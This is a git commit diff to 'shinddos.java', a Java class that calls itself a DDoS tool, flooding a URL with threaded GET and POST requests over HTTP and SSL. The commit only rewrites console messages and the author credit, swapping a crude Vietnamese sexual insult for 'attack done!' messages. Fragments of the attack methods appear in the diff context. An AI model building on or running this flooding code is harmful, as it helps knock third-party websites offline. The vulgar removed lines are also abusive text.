10c9473c2a61e0dfca4564d71e8cf0937de8f6c7
shinplus999 <102015035+shinplus999@users.noreply.github.com>
2022-06-30 16:51:43 +0700

    Update shinddos.java

--- shinddos.java
+++ shinddos.java
@@ -66,7 +66,7 @@ public class Dos implements Runnable {
             dos.sslCheckConnection(url);
         }
 
-        System.out.println("Setting DDoS By: Shin Plus");
+        System.out.println("Setting DDoS By: Shadow Tak");
 
         System.out.print("Thread: ");
         String amount = in.nextLine();
@@ -158,7 +158,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("Đang bú cu Shin dz!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("POST attack done!: " + responseCode + "Thread: " + this.seq);
     }
 
     private void getAttack(String url) throws Exception {
@@ -168,7 +168,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("Đang bú cu Shin dz : " + responseCode + "Thread: " + this.seq);
+        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
     }
 
     private void sslPostAttack(String url) throws Exception {
@@ -185,7 +185,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("Đang bú cu Shin dz!:" + responseCode + "Thread: " + this.seq);
+        System.out.println("GET attack done!:" + responseCode + "Thread: " + this.seq);
     }
 
     private void sslGetAttack(String url) throws Exception {
@@ -195,6 +195,6 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("Đang bú cu Shin dz!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
     }
 }
